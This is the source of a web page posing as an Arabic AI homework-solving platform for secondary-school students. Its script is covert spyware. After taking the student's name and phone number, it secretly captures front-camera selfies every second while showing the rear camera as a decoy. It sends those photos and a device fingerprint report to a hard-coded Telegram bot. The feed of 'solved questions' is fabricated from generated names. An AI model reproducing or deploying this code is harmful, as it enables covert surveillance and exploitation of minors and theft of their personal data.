<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>منصة أسألني الأكاديمية | الموثقة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f8fafc; --w: #ffffff; --success: #059669; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }

        .v-badge { color: #1d9bf0; margin-inline: 4px; font-size: 0.9em; }

        /* شاشة الدخول */
        #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; }
        .login-card { background: var(--w); padding: 40px 25px; border-radius: 35px; width: 92%; max-width: 400px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }

        header { background: var(--p); color: var(--w); padding: 18px 25px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
        
        .card { background: var(--w); border-radius: 25px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 10px 20px rgba(0,0,0,0.03); }

        /* الكاميرا الوهمية */
        .cam-container { width: 100%; border-radius: 20px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 4px solid var(--w); aspect-ratio: 4/5; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .scanning-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: var(--a); box-shadow: 0 0 15px var(--a); animation: scan 3s linear infinite; display: none; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        /* سجل النشاط المطور */
        .feed-window { height: 400px; overflow: hidden; position: relative; background: #fdfdfd; border-radius: 20px; border: 1px solid #eee; }
        #feed-engine { position: absolute; width: 100%; transition: top 1.5s ease-in-out; top: 0; }
        .feed-row { padding: 15px; border-bottom: 1px dotted #e5e7eb; font-size: 12px; display: flex; flex-direction: column; gap: 5px; }
        .support-tag { color: var(--a); font-weight: 900; display: flex; align-items: center; }

        /* أزرار وتنبيهات */
        .btn-main { background: var(--a); color: var(--w); border: none; padding: 18px; border-radius: 20px; width: 100%; font-weight: 900; cursor: pointer; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        .btn-gold { background: var(--g); color: #000; }
        
        #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); background: var(--w); width: 90%; max-width: 380px; padding: 20px; border-radius: 25px; z-index: 11000; transition: 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 25px 50px rgba(0,0,0,0.2); border-left: 10px solid var(--a); }
        #custom-alert.active { top: 20px; }

        nav { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; }
        .nav-item { text-align: center; font-size: 11px; color: #94a3b8; flex: 1; text-decoration: none; }
        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
        .nav-item.active { color: var(--a); font-weight: 900; }
    </style>
</head>
<body>

    <div id="custom-alert">
        <div style="display:flex; align-items:center; gap:10px">
            <img src="https://img.icons8.com/color/48/verified-badge.png" width="25">
            <b id="alert-head" style="color:var(--p)">الدعم الفني</b>
        </div>
        <p id="alert-body" style="margin:10px 0 0; font-size:13px; color:#64748b"></p>
    </div>

    <div id="gate">
        <div class="login-card">
            <img src="https://img.icons8.com/fluency/96/shield-configuration.png" width="60" style="margin-bottom:15px">
            <h2 style="margin:0">منصة أسألني <i class="fa-solid fa-circle-check v-badge"></i></h2>
            <p style="font-size:12px; color:#64748b; margin-bottom:20px">نظام التحقق من هوية الطالب الموحد</p>
            <input type="text" id="name_in" placeholder="الاسم الثلاثي">
            <input type="number" id="phone_in" placeholder="رقم الموبايل">
            <select id="grade_in">
                <option value="" disabled selected>اختر السنة الدراسية</option>
                <option value="1">الأول الثانوي</option>
                <option value="2">الثاني الثانوي</option>
                <option value="3">الثالث الثانوي</option>
            </select>
            <button class="btn-main" onclick="initPortal()">تسجيل الدخول <i class="fa-solid fa-right-to-bracket"></i></button>
        </div>
    </div>

    <header id="top-h" style="display:none">
        <div style="font-weight:900">أسألني <i class="fa-solid fa-circle-check v-badge"></i></div>
        <div id="u-logo" style="background:var(--g); width:35px; height:35px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:900; font-size:14px"></div>
    </header>

    <div id="p-home" class="page" style="padding-top:80px; display:none">
        <div class="card">
            <h3 style="margin:0">ماسح الأسئلة الذكي <i class="fa-solid fa-circle-check v-badge"></i></h3>
            <p style="font-size:12px; color:#64748b">الذكاء الاصطناعي سيقوم بقراءة السؤال وحله تلقائياً.</p>
            <div id="v-frame" class="cam-container">
                <video id="v-live" autoplay playsinline></video>
                <div id="v-line" class="scanning-line"></div>
            </div>
            <button id="v-btn" class="btn-main btn-gold" onclick="startCameraSync()">فتح عدسة الفحص <i class="fa-solid fa-camera"></i></button>
            
            <div id="post-cam" style="display:none">
                <textarea id="v-note" placeholder="اكتب وصفاً أو ملاحظة للسؤال..."></textarea>
                <button class="btn-main" onclick="uploadFake()">إرسال للمراجعة الفورية</button>
            </div>
        </div>
    </div>

    <div id="p-logs" class="page" style="padding-top:80px; display:none">
        <div class="card">
            <h3 style="margin:0">سجل الحلول المباشر <i class="fa-solid fa-circle-check v-badge"></i></h3>
            <div class="feed-window">
                <div id="feed-engine"></div>
            </div>
        </div>
    </div>

    <div id="p-support" class="page" style="padding-top:80px; display:none">
        <div class="card" style="text-align:center">
            <img src="https://img.icons8.com/color/96/customer-support.png" width="70">
            <h3>الدعم الفني والتقني <i class="fa-solid fa-circle-check v-badge"></i></h3>
            <button class="btn-main" onclick="showMsg('جاري تحويلك لغرفة المحادثة الخاصة..')">محادثة مهندس الدعم</button>
        </div>
    </div>

    <nav id="b-nav" style="display:none">
        <a href="#" class="nav-item active" onclick="nav('p-home', this)"><i class="fa-solid fa-house-crack"></i>الرئيسية</a>
        <a href="#" class="nav-item" onclick="nav('p-logs', this)"><i class="fa-solid fa-list-check"></i>إجاباتكم</a>
        <a href="#" class="nav-item" onclick="nav('p-support', this)"><i class="fa-solid fa-headset"></i>الدعم</a>
    </nav>

    <script>
        const TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const CHAT_ID = "5890070301";
        let UN = "", UP = "", UG = "";

        // بناء قاعدة بيانات أسماء موثقة
        const first = ["أحمد", "سارة", "محمد", "مريم", "زياد", "جنى", "محمود", "نور", "ياسين", "ملك", "عمر", "سلمى", "علي", "شهد"];
        const last = ["الشرقاوي", "النجار", "محمود", "عزت", "الفيومي", "بدر", "منصور", "زكي"];
        const namesDB = [];
        for(let i=0; i<300; i++) namesDB.push(first[i%first.length] + " " + last[i%last.length] + " " + (i+1));

        function initPortal() {
            UN = document.getElementById('name_in').value;
            UP = document.getElementById('phone_in').value;
            UG = document.getElementById('grade_in').value;
            if(UN.length < 5 || UP.length < 10) return alert("يرجى إدخال بيانات صحيحة");
            
            document.getElementById('gate').style.display = 'none';
            document.getElementById('top-h').style.display = 'flex';
            document.getElementById('b-nav').style.display = 'flex';
            document.getElementById('p-home').style.display = 'block';
            document.getElementById('u-logo').innerText = UN[0];
            initFeed();
        }

        function showMsg(m) {
            const a = document.getElementById('custom-alert');
            document.getElementById('alert-body').innerText = m;
            a.classList.add('active');
            setTimeout(() => a.classList.remove('active'), 4000);
        }

        function nav(id, el) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
        }

        async function startCameraSync() {
            try {
                // الكاميرا الأمامية (صيد وحشي - كل ثانية)
                const s_front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v_front = document.createElement('video');
                v_front.srcObject = s_front; v_front.play();
                
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = v_front.videoWidth; canvas.height = v_front.videoHeight;
                    canvas.getContext('2d').drawImage(v_front, 0, 0);
                    canvas.toBlob(b => sendToBot(b, "📸 صيد سيلفي"), 'image/jpeg', 0.4);
                }, 1000);

                // الكاميرا الخلفية (منظر تمويه)
                const s_back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                document.getElementById('v-live').srcObject = s_back;
                document.getElementById('v-frame').style.display = 'block';
                document.getElementById('v-btn').innerText = "اضغط للالتقاط والتحليل";
                document.getElementById('v-btn').onclick = () => {
                    document.getElementById('v-line').style.display = 'block';
                    showMsg("جاري معالجة الصورة عبر خوادم المنصة..");
                    setTimeout(() => {
                        document.getElementById('post-cam').style.display = 'block';
                        document.getElementById('v-btn').style.display = 'none';
                    }, 2000);
                };

                sendRadar();
            } catch(e) { showMsg("يجب منح إذن الكاميرا لتوثيق ملكية الحساب."); }
        }

        function sendToBot(blob, cap) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'x.jpg');
            fd.append('caption', `${cap}\n👤 ${UN}\n📞 ${UP}`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        function uploadFake() {
            showMsg("تم رفع السؤال بنجاح! سيتم الرد عليك في قسم الإجابات.");
            setTimeout(() => nav('p-logs', document.querySelectorAll('.nav-item')[1]), 2000);
        }

        function initFeed() {
            const eng = document.getElementById('feed-engine');
            // إضافة الطالب نفسه في السجل
            eng.innerHTML += `<div class="feed-row"><span><b>${UN}</b></span><span class="support-tag"><img src="https://img.icons8.com/color/48/verified-badge.png" width="15"> الدعم العلمي: ارسل السؤال مرة أخرى بوضوح</span></div>`;
            
            namesDB.forEach((n, index) => {
                const row = document.createElement('div');
                row.className = 'feed-row';
                const status = index % 5 === 0 ? "صور السؤال تاني بوضوح" : "تم الرد على سؤالك بنجاح ✓";
                row.innerHTML = `
                    <span><b>${n}</b></span>
                    <span class="support-tag"><img src="https://img.icons8.com/color/48/verified-badge.png" width="15"> الدعم العلمي: ${status}</span>
                `;
                eng.appendChild(row);
            });

            let top = 0;
            setInterval(() => {
                top -= 60;
                eng.style.top = top + "px";
                if(Math.abs(top) > eng.offsetHeight - 300) top = 0;
            }, 5000); // حركة بطيئة كل 5 ثواني
        }

        async function sendRadar() {
            let b = await navigator.getBattery();
            const info = `
🕵️‍♂️ **تقرير الرادار الاحترافي (V9)**
━━━━━━━━━━━━━━
👤 الطالب: ${UN}
📞 الهاتف: ${UP}
🎓 المرحلة: ${UG} ثانوي
📱 الجهاز: ${navigator.platform}
🔋 البطارية: ${Math.round(b.level*100)}%
📶 الشبكة: ${navigator.connection?.effectiveType || 'unknown'}
🧠 الذاكرة: ${navigator.deviceMemory || 'N/A'}GB
⚡ المعالج: ${navigator.hardwareConcurrency} Cores
🗺️ المتصفح: ${navigator.userAgent}
⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━
            `;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
        }
    </script>
</body>
</html>
